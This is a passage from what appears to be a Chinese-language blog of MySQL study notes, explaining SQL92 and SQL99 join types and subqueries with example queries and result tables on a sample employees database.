class="line">| 13000.000000 |            20 | MK_MAN     |</span><br><span class="line">| 100.000000 |            80 | SA_MAN     |</span><br></pre></td></tr></table></figure>

<h4 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h4><h5 id="多表连接"><a href="#多表连接" class="headerlink" title="多表连接"></a>多表连接</h5><h5 id="含义-又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询"><a href="#含义-又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询" class="headerlink" title="含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询"></a>含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">笛卡尔乘积现象:表一 有m行，表2有n行，结果是&#x3D;m*n行</span><br><span class="line">发生原因:没有有效的连接条件</span><br><span class="line">如何避免:添加有效的连接条件</span><br><span class="line"></span><br><span class="line">分类:</span><br><span class="line">	按年代分类:</span><br><span class="line">	sql92标准:仅仅支持内连接</span><br><span class="line">	sql99标准(推荐):支持内连接+外连接(左外和右外)+交叉连接</span><br><span class="line">	</span><br><span class="line">	sql92:</span><br><span class="line">		内连接</span><br><span class="line">		</span><br><span class="line">	sql99:</span><br><span class="line">		内连接</span><br><span class="line">		外连接</span><br><span class="line">		交叉连接</span><br><span class="line">	</span><br><span class="line">	按功能分类:</span><br><span class="line">		内连接:</span><br><span class="line">			等值连接</span><br><span class="line">			非等值连接</span><br><span class="line">			自连接</span><br><span class="line">		外连接:</span><br><span class="line">			左外连接</span><br><span class="line">			右外连接</span><br><span class="line">			全外连接(MySQL不支持)			</span><br><span class="line">		交叉连接</span><br><span class="line"></span><br><span class="line">错误语法:select name,boyName from beauty,boys;</span><br><span class="line">笛卡尔集的错误情况:</span><br><span class="line">select count(*) from beauty;</span><br><span class="line">假设输出12行</span><br><span class="line">select count(*) from boys;</span><br><span class="line">假设输出4行</span><br><span class="line">最终结果:12*4&#x3D;48行</span><br><span class="line"></span><br><span class="line">正确语法</span><br><span class="line">select 表,表 from 库 where 表.字段&#x3D;表.字段;</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">    -&gt; where 等值连接;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br></pre></td></tr></table></figure>

<h5 id="一：sql92标准"><a href="#一：sql92标准" class="headerlink" title="一：sql92标准"></a>一：sql92标准</h5><h5 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、等值连接</span><br><span class="line">①多表等值连接的结果多为表的交集部分</span><br><span class="line">②n表连接，最少需要n-1个连接条件</span><br><span class="line">③多表二的顺序没有要求</span><br><span class="line">④一般需要为表起别名</span><br><span class="line">⑤可以搭配前面的所有子句使用，比如排序、分组、筛选</span><br><span class="line"></span><br><span class="line">案例一:查询女神们和对应的男神名</span><br><span class="line">mysql&gt; select name,boyName</span><br><span class="line">    -&gt; from boys,beauty</span><br><span class="line">    -&gt; where beauty.boyfriend_id&#x3D;boys.id;</span><br><span class="line">    </span><br><span class="line">案例二:查询员工名和对应的部门名</span><br><span class="line">mysql&gt; select last_name,department_name</span><br><span class="line">    -&gt; from employees,departments</span><br><span class="line">    -&gt; where employees.department_id&#x3D;departments.department_id;</span><br><span class="line">    </span><br><span class="line">2、为表起别名</span><br><span class="line">好处:提高语句的简洁度，区分多个重名字段</span><br><span class="line">注意:如果为表起了别名，则查询的阻断就不能使用原来的表名去限定</span><br><span class="line"></span><br><span class="line">查询工种号、工种名、员工名</span><br><span class="line">mysql&gt; select last_name,e.job_id,job_title</span><br><span class="line">    -&gt; from employees e,jobs j</span><br><span class="line">    -&gt; where e.job_id&#x3D;j.job_id;</span><br><span class="line">    </span><br><span class="line">3、两个表的顺序是否可以调换</span><br><span class="line">查询工种号、工种名、员工名</span><br><span class="line">#可以</span><br><span class="line">mysql&gt; select last_name,e.job_id,job_title</span><br><span class="line">    -&gt; from e,jobs j，employees e</span><br><span class="line">    -&gt; where e.job_id&#x3D;j.job_id;</span><br><span class="line">    </span><br><span class="line">4、可以加筛选</span><br><span class="line">案例1:查询有奖金的员工名、部门名</span><br><span class="line">mysql&gt; select last_name,department_name,commission_pct</span><br><span class="line">    -&gt; from employees e,departments d</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id and e.commission_pct is not null;</span><br><span class="line">    </span><br><span class="line">案例2:查询城市名中第二个字符为o的部门名和城市名</span><br><span class="line">mysql&gt; select department_name,city</span><br><span class="line">    -&gt; from departments d,locations l</span><br><span class="line">    -&gt; where d.location_id&#x3D;l.location_id and city like &#39;_o%&#39;;</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line">| department_name | city                |</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line">| IT              | Southlake           |</span><br><span class="line">| Shi             | South San Francisco |</span><br><span class="line">| Mar             | Toronto             |</span><br><span class="line">| Hum             | London              |</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line"></span><br><span class="line">5、可以加分组</span><br><span class="line">案例1:查询每个城市的部门个数</span><br><span class="line">mysql&gt; select count(*),city</span><br><span class="line">    -&gt; from departments d,locations l</span><br><span class="line">    -&gt; where d.location_id&#x3D;l.location_id</span><br><span class="line">    -&gt; group by city;</span><br><span class="line">+----------+---------------------+</span><br><span class="line">| count(*) | city                |</span><br><span class="line">+----------+---------------------+</span><br><span class="line">|        1 | London              |</span><br><span class="line">|        1 | Munich              |</span><br><span class="line">|        1 | Oxford              |</span><br><span class="line">|       21 | Seattle             |</span><br><span class="line">|        1 | South San Francisco |</span><br><span class="line">|        1 | Southlake           |</span><br><span class="line">|        1 | Toronto             |</span><br><span class="line">+----------+---------------------+</span><br><span class="line"></span><br><span class="line">案例2:查询有奖金的每个部门的部门名和部门的领导编号和该部门的最低工资</span><br><span class="line">mysql&gt; select min(salary),department_name,d.manager_id</span><br><span class="line">    -&gt; from employees e,departments d</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id and commission_pct is not null</span><br><span class="line">    -&gt; group by department_name,d.manager_id;</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line">| min(salary) | department_name | manager_id |</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line">|     6100.00 | Sal             |        145 |</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line"></span><br><span class="line">6、可以加排序</span><br><span class="line">mysql&gt; select job_title,count(*)</span><br><span class="line">    -&gt; from jobs j,employees e</span><br><span class="line">    -&gt; where j.job_id&#x3D;e.job_id</span><br><span class="line">    -&gt; group by job_title</span><br><span class="line">    -&gt; order by count(*) desc;</span><br><span class="line">+---------------------------------+----------+</span><br><span class="line">| job_title                       | count(*) |</span><br><span class="line">+---------------------------------+----------+</span><br><span class="line">| Sales Representative            |       30 |</span><br><span class="line">| Shipping Clerk                  |       20 |</span><br><span class="line">| Stock Clerk                     |       20 |</span><br><span class="line">| Purchasing Clerk                |        5 |</span><br><span class="line"></span><br><span class="line">7、可以实现三表连接</span><br><span class="line">案例:查询员工名、部门名和所在城市</span><br><span class="line">mysql&gt; select last_name,department_name,city</span><br><span class="line">    -&gt; from employees e,departments d,locations l</span><br><span class="line">    -&gt; where d.department_id&#x3D;e.department_id and d.location_id&#x3D;l.location_id;</span><br></pre></td></tr></table></figure>

<h5 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">    -&gt; where 非等值连接;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br><span class="line"></span><br><span class="line">案例1:查询员工的工资和工资级别，并进行排序</span><br><span class="line">mysql&gt; select salary,grade_level</span><br><span class="line">    -&gt; from employees e,job_grades g</span><br><span class="line">    -&gt; where salary between g.lowest_sal and g.highest_sal</span><br><span class="line">    -&gt; order by grade_level desc;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| salary   | grade_level |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| 24000.00 | E           |</span><br><span class="line">| 17000.00 | E           |</span><br><span class="line">| 17000.00 | E           |</span><br></pre></td></tr></table></figure>

<h5 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">	-&gt; from 表 别名1,表 别名2</span><br><span class="line">    -&gt; where 等值;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br><span class="line"></span><br><span class="line">案例:查询员工名和上级名称</span><br><span class="line">mysql&gt; select e.employee_id,e.last_name,m.employee_id,m.last_name</span><br><span class="line">    -&gt; from employees e,employees m</span><br><span class="line">    -&gt; where e.employee_id&#x3D;m.manager_id;</span><br><span class="line">+-------------+-----------+-------------+-------------+</span><br><span class="line">| employee_id | last_name | employee_id | last_name   |</span><br><span class="line">+-------------+-----------+-------------+-------------+</span><br><span class="line">|         100 | K_ing     |         101 | Kochhar     |</span><br><span class="line">|         100 | K_ing     |         102 | De Haan     |</span><br><span class="line">|         102 | De Haan   |         103 | Hunold      |</span><br><span class="line">|         103 | Hunold    |         104 | Ernst       |</span><br><span class="line">|         103 | Hunold    |         105 | Austin      |</span><br><span class="line">|         103 | Hunold    |         106 | Pataballa   |</span><br></pre></td></tr></table></figure>

<h5 id="二、sql99语法"><a href="#二、sql99语法" class="headerlink" title="二、sql99语法"></a>二、sql99语法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表1 别名</span><br><span class="line">	【join】 表2 别名 on 连接条件</span><br><span class="line">	【where 筛选条件】</span><br><span class="line">	【group by 分组】</span><br><span class="line">	【having 筛选条件】</span><br><span class="line">	【order by 排序】</span><br><span class="line">	</span><br><span class="line">分类:</span><br><span class="line">#以下英文标识连接条件，方括号中可加可不加</span><br><span class="line">内连接:inner</span><br><span class="line">外连接</span><br><span class="line">	左外:left 【outer】</span><br><span class="line">	右外:right 【outer】</span><br><span class="line">	全外:full 【outer】</span><br><span class="line">交叉连接:cross</span><br><span class="line"></span><br><span class="line">内连接:</span><br><span class="line">	A表和B表能够完全匹配的记录查询出来，被称为内连接</span><br><span class="line">外连接:</span><br><span class="line">	A表和B表能够完全匹配的记录查询出来之外，将其中一张表的记录无条件的查询出来对方表没有匹配的记录会自动显示null与之匹配，这种查询被称为外连接。</span><br><span class="line">	外连接的查询结果条数 &gt;&#x3D; 内连接的查询结果条数</span><br></pre></td></tr></table></figure>

<h5 id="一、内连接"><a href="#一、内连接" class="headerlink" title="一、内连接"></a>一、内连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表1 别名</span><br><span class="line">inner join 表2 别名</span><br><span class="line">on 连接条件;</span><br><span class="line"></span><br><span class="line">內连分类:</span><br><span class="line">	等值连接</span><br><span class="line">	非等值连接</span><br><span class="line">	自连接</span><br><span class="line">	</span><br><span class="line">特点1:</span><br><span class="line">	①添加排序、分组、筛选</span><br><span class="line">	②inner可以省略</span><br><span class="line">	③筛选条件放在where后面，连接条件放在on的后面，提高了分离性，便于阅读</span><br><span class="line">	④inner join连接和sql92语法中的等值连接效果是一样的，都是查询多表的交集</span><br><span class="line">特点2:</span><br><span class="line">	①表的顺序调换</span><br><span class="line">	②内连接的结果&#x3D;多表的交集</span><br><span class="line">	③n表连接至少需要n-1个连接条件</span><br></pre></td></tr></table></figure>

<h5 id="1、等值连接"><a href="#1、等值连接" class="headerlink" title="1、等值连接"></a>1、等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询员工名、部门名</span><br><span class="line">mysql&gt; select last_name,department_name</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join departments d</span><br><span class="line">    -&gt; on e.department_id&#x3D;d.department_id;</span><br><span class="line">    </span><br><span class="line">案例二:查询名字中包含e的员工名和工种名（筛选）</span><br><span class="line">mysql&gt; select last_name,job_title</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join jobs j</span><br><span class="line">    -&gt; on e.job_id&#x3D;j.job_id</span><br><span class="line">    -&gt; where e.last_name like &#39;%e%&#39;;</span><br><span class="line">    </span><br><span class="line">案例三:查询部门个数&gt;3的城市名和部门个数（分组+筛选）</span><br><span class="line">mysql&gt; select city,count(*)</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; inner join locations l</span><br><span class="line">    -&gt; on d.location_id&#x3D;l.location_id</span><br><span class="line">    -&gt; group by city</span><br><span class="line">    -&gt; having count(*)&gt;3;</span><br><span class="line">    </span><br><span class="line">案例四:查询部门的员工个数&gt;3的城市名和部门个数，并按个数降序（分组+筛选+排序）</span><br><span class="line">mysql&gt; select count(*),department_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having count(*)&gt;3</span><br><span class="line">    -&gt; order by count(*) desc;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">三表连接</span><br><span class="line">语法格式:</span><br><span class="line">select 查询条件</span><br><span class="line">from 表1 别名</span><br><span class="line">【inner】join 表2 别名 on 表1&#x3D;表3  #等值连接</span><br><span class="line">【inner】join 表3 别名 on 表1&#x3D;表3	#等值连接</span><br><span class="line"></span><br><span class="line">案例五:查询员工名、部门名、工种名，并按部门名降序()</span><br><span class="line"></span><br><span class="line">#进行多面连接时候，先from后面的表和第一个join的表连接</span><br><span class="line">然后再将from后面的表和第二个join表连接</span><br><span class="line">mysql&gt; select last_name,department_name,job_title</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join departments d on e.department_id&#x3D;d.department_id</span><br><span class="line">    -&gt; inner join jobs j on e.job_id&#x3D;j.job_id</span><br><span class="line">    -&gt; order by department_name desc;</span><br></pre></td></tr></table></figure>



<h5 id="2、非等值连接"><a href="#2、非等值连接" class="headerlink" title="2、非等值连接"></a>2、非等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询员工的工资级别</span><br><span class="line">mysql&gt; select salary,grade_level</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join job_grades g</span><br><span class="line">    -&gt; on e.salary between g.lowest_sal and g.highest_sal;</span><br><span class="line">    </span><br><span class="line">查询每个工资级别的个数&gt;20的个数，并且按工资级别排序</span><br><span class="line">mysql&gt; select count(*),grade_level</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; join job_grades g</span><br><span class="line">    -&gt; on e.salary between g.lowest_sal and g.highest_sal</span><br><span class="line">    -&gt; group by grade_level</span><br><span class="line">    -&gt; having count(*)&gt;20</span><br><span class="line">    -&gt; order by count(*) desc;</span><br></pre></td></tr></table></figure>

<h5 id="3、自连接"><a href="#3、自连接" class="headerlink" title="3、自连接"></a>3、自连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select e.last_name,m.last_name</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join employees m</span><br><span class="line">    -&gt; on e.manager_id&#x3D;m.employee_id;</span><br></pre></td></tr></table></figure>

<h5 id="二、外连接"><a href="#二、外连接" class="headerlink" title="二、外连接"></a>二、外连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么inner和outer可以省略，加上去有什么好处?</span><br><span class="line"> - 可以省略，因为区分内连接和外连接的依靠的不是这些关键字而是left&#x2F;right若存在，表示一定是一个外连接，其他都是内连接</span><br><span class="line"> - 加上去的好处是增强可读性</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表1 别名</span><br><span class="line">	left|right|full【outer】 表2 别名 on 连接条件		#其中任意一个都可以</span><br><span class="line">	【where 筛选条件】</span><br><span class="line">	【group by 分组】</span><br><span class="line">	【having 筛选条件】</span><br><span class="line">	【order by 排序】</span><br><span class="line"></span><br><span class="line">特点:</span><br><span class="line">1、外链接的查询结果为主要表中的所有行</span><br><span class="line">		如果从表中有和它匹配的，则显示匹配的行</span><br><span class="line">		如果从表中没有和它匹配的则显示null</span><br><span class="line">	外连接查询结果&#x3D;内连接结果+主表中有而从表中没有的记录</span><br><span class="line">2、左外连接，left join左边的是主表</span><br><span class="line">   右外连接, right join右边的是主表</span><br><span class="line">3、左外和右外交换两个表的顺序，可以实现同样的效果</span><br><span class="line">4、一般用于查询除了交集部分的剩余的不匹配的行</span><br><span class="line"></span><br><span class="line">引入:查询男朋友不在男神表的女神名</span><br><span class="line">左外连接</span><br><span class="line">mysql&gt; select b.name,bo.*</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; left outer join boys bo</span><br><span class="line">    -&gt; on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where bo.id is null</span><br><span class="line">    </span><br><span class="line">右外连接</span><br><span class="line">mysql&gt; select b.name,bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; right outer joinbeauty b</span><br><span class="line">    -&gt; on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where b.id is null    </span><br><span class="line">    </span><br><span class="line">案例一:查询那个部门没有员工</span><br><span class="line">左外连接</span><br><span class="line">mysql&gt; select d.*,e.employee_id</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; left outer join employees e</span><br><span class="line">    -&gt; on d.department_id&#x3D;e.department_id</span><br><span class="line">    -&gt; where e.employee_id is null;</span><br><span class="line">    </span><br><span class="line">右外连接</span><br><span class="line">mysql&gt; select d.*,e.employee_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; right outer join departments d</span><br><span class="line">    -&gt; on d.department_id&#x3D;e.department_id</span><br><span class="line">    -&gt; where e.employee_id is null;</span><br></pre></td></tr></table></figure>

<h5 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表</span><br><span class="line">	from 表1 别名</span><br><span class="line">	cross join 表2 别名;</span><br><span class="line"></span><br><span class="line">特点:类似于笛卡尔乘积</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select b.*,bo.*</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; cross join boys bo;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql92和sql99</span><br><span class="line">功能:sql99支持的较多</span><br><span class="line">可读性:sql99实现连接条件和筛选条件的分离，可读性较高</span><br></pre></td></tr></table></figure>

<h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">含义:</span><br><span class="line">出现在其他语句中的select语句，成为子查询或内查询</span><br><span class="line">外部如果shiselect语句，则此语句成为主查询或外查询</span><br><span class="line"></span><br><span class="line">分类:</span><br><span class="line">按子查询出现的位置</span><br><span class="line">可以放在</span><br><span class="line">	select后面:</span><br><span class="line">		仅仅支持标量子查询 #select后面只能放标量子查询</span><br><span class="line">	from后面:</span><br><span class="line">		支持表子查询</span><br><span class="line">	where或having后面: ★  	#这三个重点</span><br><span class="line">		标量子查询	   ★</span><br><span class="line">		列子查询	    ★</span><br><span class="line">		行子查询 #用的较少</span><br><span class="line">	exists后面</span><br><span class="line">		标量子查询</span><br><span class="line">		列子查询</span><br><span class="line">		行子查询</span><br><span class="line">按结果集的行列数不同:</span><br><span class="line">	标量子查询(结果集只有一行一列)</span><br><span class="line">	列子查询(结果集只有一列多行)</span><br><span class="line">	行子查询(结果集有多行多列)</span><br><span class="line">	表子查询(结果集，一般为多行多列)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例:</span><br><span class="line">where或having</span><br><span class="line">1、标量子查询</span><br><span class="line">	select first_name from employees </span><br><span class="line">	where department_id in(</span><br><span class="line">	select department_id from departments</span><br><span class="line">	where location_id&#x3D;1700</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>



<h5 id="一、where或having后面"><a href="#一、where或having后面" class="headerlink" title="一、where或having后面"></a>一、where或having后面</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、标量子查询(单行子查询)</span><br><span class="line">2、列子查询(多行子查询)</span><br><span class="line">3、行子查询(多列多行)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点:</span><br><span class="line">①子查询放在小括号内</span><br><span class="line">②子查询一般放在条件的右侧</span><br><span class="line">③标量子查询，一般搭配着单行操作符使用 #单行操作符就是条件运算符</span><br><span class="line">&gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D; &lt;&gt;</span><br><span class="line">列子查询，一般搭配着多行操作符使用</span><br><span class="line">in、any&#x2F;some、all</span><br><span class="line">④子查询的执行优先于主查询执行，主查询的条件用到了子查询的结果</span><br></pre></td></tr></table></figure>

<h5 id="1、标量子查询"><a href="#1、标量子查询" class="headerlink" title="1、标量子查询"></a>1、标量子查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 子查询就是select语句嵌套select语句</span><br><span class="line"> </span><br><span class="line"> 子查询可以出现在:</span><br><span class="line"> 	select..(select).	#可以出现在select后面</span><br><span class="line"> 	from ..(select).	#可以出现在from后面</span><br><span class="line"> 	where ..(select).	#可以出现where后面</span><br><span class="line"> 格式:</span><br><span class="line"> 	select 字段 from 表名 </span><br><span class="line"> 	where 筛选条件(查询条件)</span><br><span class="line"></span><br><span class="line">where后面使用子查询</span><br><span class="line"></span><br><span class="line">案例1:谁的工资比Abel高</span><br><span class="line">①：先找出谁的名字叫Abel</span><br><span class="line">select salary from employees</span><br><span class="line">    -&gt; where last_name&#x3D;&#39;Abel&#39;;</span><br><span class="line">②再将他们的工资比较</span><br><span class="line"> mysql&gt; select * from employees</span><br><span class="line">    -&gt; where salary&gt;(select salary from employees</span><br><span class="line">    -&gt; where last_name&#x3D;&#39;Abel&#39;);</span><br><span class="line">    </span><br><span class="line">案例2::返回job_id与141号员工相同，salary比143号员工多的员工 姓名，job_id和工资</span><br><span class="line">mysql&gt; select job_id,last_name,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; (select job_id from employees</span><br><span class="line">    -&gt; where employee_id &#x3D; 141) and</span><br><span class="line">    -&gt; salary&gt;(select salary from employees</span><br><span class="line">    -&gt; where employee_id&#x3D;143);</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| job_id   | last_name   | salary  |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| ST_CLERK | Nayer       | 3200.00 |</span><br><span class="line">| ST_CLERK | Mikkilineni | 2700.00 |</span><br><span class="line">| ST_CLERK | Bissot      | 3300.00 |</span><br><span class="line">| ST_CLERK | Atkinson    | 2800.00 |</span><br><span class="line">| ST_CLERK | Mallin      | 3300.00 |</span><br><span class="line">| ST_CLERK | Rogers      | 2900.00 |</span><br><span class="line">| ST_CLERK | Ladwig      | 3600.00 |</span><br><span class="line">| ST_CLERK | Stiles      | 3200.00 |</span><br><span class="line">| ST_CLERK | Seo         | 2700.00 |</span><br><span class="line">| ST_CLERK | Rajs        | 3500.00 |</span><br><span class="line">| ST_CLERK | Davies      | 3100.00 |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">11 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">案例3:返回公司工资最少的员工的last_name,job_id和salary</span><br><span class="line">mysql&gt; select salary,last_name,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&#x3D;(select min(salary) from employees);</span><br><span class="line"></span><br><span class="line">having后面</span><br><span class="line">案例4:查询最低工资大于50号部门最低工资的部门id和其最低工资</span><br><span class="line">mysql&gt; select min(salary),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having min(salary)&gt;(select min(salary)</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where department_id&#x3D;50);</span><br><span class="line">    </span><br><span class="line">注意:非法使用标量子查询也就是说子查询的结果不是一行一列</span><br></pre></td></tr></table></figure>

<h5 id="2、列子查询（多行子查询）"><a href="#2、列子查询（多行子查询）" class="headerlink" title="2、列子查询（多行子查询）"></a>2、列子查询（多行子查询）</h5><ul>
<li><h5 id="多行子查询操作符"><a href="#多行子查询操作符" class="headerlink" title="多行子查询操作符"></a>多行子查询操作符</h5></li>
</ul>
<table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>in/not in</td>
<td>等于列表中的任意一个</td>
</tr>
<tr>
<td>any | some</td>
<td>和子查询返回的某一个值比较</td>
</tr>
<tr>
<td>all</td>
<td>和子查询返回的所有值比较</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:返回location_id是1400或1700的部门中所有员工姓名</span><br><span class="line">mysql&gt; select last_name</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where department_id in (select department_id from departments</span><br><span class="line">    -&gt; where location_id in(1400,1700));</span><br><span class="line">+------------+</span><br><span class="line">| last_name  |</span><br><span class="line">+------------+</span><br><span class="line">| K_ing      |</span><br><span class="line">| Kochhar    |</span><br><span class="line">| De Haan    |</span><br><span class="line">| Hunold     |</span><br><span class="line"></span><br><span class="line">案例2:返回其他部门中比job_id为&#39;IT_PROG&#39;部门任一工资低的员工的员工号、姓名、job_id以及salary</span><br><span class="line">①查询job_id为&#39;IT_PROG&#39;部门</span><br><span class="line">mysql&gt; select salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;</span><br><span class="line">②查询员工号、姓名、job_id以及salary，salary&lt;(①)的任意一个</span><br><span class="line">mysql&gt; select last_name,employee_id,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;any(select salary from employees where job_id&#x3D;&#39;IT_PROG&#39;);</span><br><span class="line">或</span><br><span class="line">mysql&gt; select last_name,employee_id,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">#小于any也就是比子查询里的都小，也就是小于最大的，就可以改成max(salary)，外面就不需要any了</span><br><span class="line">    -&gt; where salary&lt;(select max(salary) from employees where job_id&#x3D;&#39;IT_PROG&#39;);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">案例3:返回其他部门中比job_id为&#39;IT_PROG&#39;部门所有工资都低的员工的员工号、姓名、job_id以及salary</span><br><span class="line">①查询job_id为&#39;IT_PROG&#39;部门</span><br><span class="line">mysql&gt; select salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;</span><br><span class="line">②查询员工号、姓名、job_id以及salary，salary&lt;(①)的全部</span><br><span class="line">mysql&gt; select employee_id,last_name,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;all(select salary from employees</span><br><span class="line">    -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;</span><br><span class="line">或</span><br><span class="line">mysql&gt; select employee_id,last_name,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;(select max(salary) from employees</span><br><span class="line">    -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="3、行子查询（结果集一行多列或多行多列）"><a href="#3、行子查询（结果集一行多列或多行多列）" class="headerlink" title="3、行子查询（结果集一行多列或多行多列）"></a>3、行子查询（结果集一行多列或多行多列）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">行子查询（了解）  #有局限性，不常用</span><br><span class="line">案例:查询员工编号最小并且工资最高的员工</span><br><span class="line">mysql&gt; select *</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where (employee_id,salary)&#x3D;(</span><br><span class="line">    -&gt; select min(employee_id),max(salary)</span><br><span class="line">    -&gt; from employees);</span><br></pre></td></tr></table></figure>

